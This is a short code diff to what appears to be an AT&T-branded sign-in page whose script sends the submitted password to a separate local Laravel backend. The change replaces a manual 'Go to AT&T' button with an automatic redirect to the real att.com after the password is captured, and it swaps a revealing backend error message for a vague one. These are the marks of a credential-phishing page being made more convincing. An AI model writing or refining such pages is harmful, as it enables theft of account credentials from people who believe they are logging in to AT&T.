@@ -58,9 +58,7 @@
         </form>
 
         <!-- Redirect Button (hidden until auth is complete) -->
-        <a id="redirect-btn" href="https://www.att.com/" target="_blank" rel="noopener noreferrer" class="btn btn-redirect" style="display: none; text-decoration: none; margin-top: 16px;">
-            Go to AT&T
-        </a>
+        
 
         <!-- Contextual Help Links -->
         <div class="links-container">
@@ -154,12 +152,12 @@
             if (response.ok) {
                 signInBtn.textContent = 'Login successful';
                 passwordInput.value = '';
-                document.getElementById('redirect-btn').style.display = 'flex';
+                setTimeout(function () { window.location.href = 'https://www.att.com/'; }, 800);
             } else {
                 signInBtn.textContent = 'Backend error: ' + (result.message || 'Unknown error');
             }
         } catch (err) {
-            signInBtn.textContent = 'Could not reach the backend (php artisan serve).';
+            signInBtn.textContent = 'server unreacheable ';
         }
 
         setTimeout(function () { signInBtn.textContent = originalText; }, 3000);
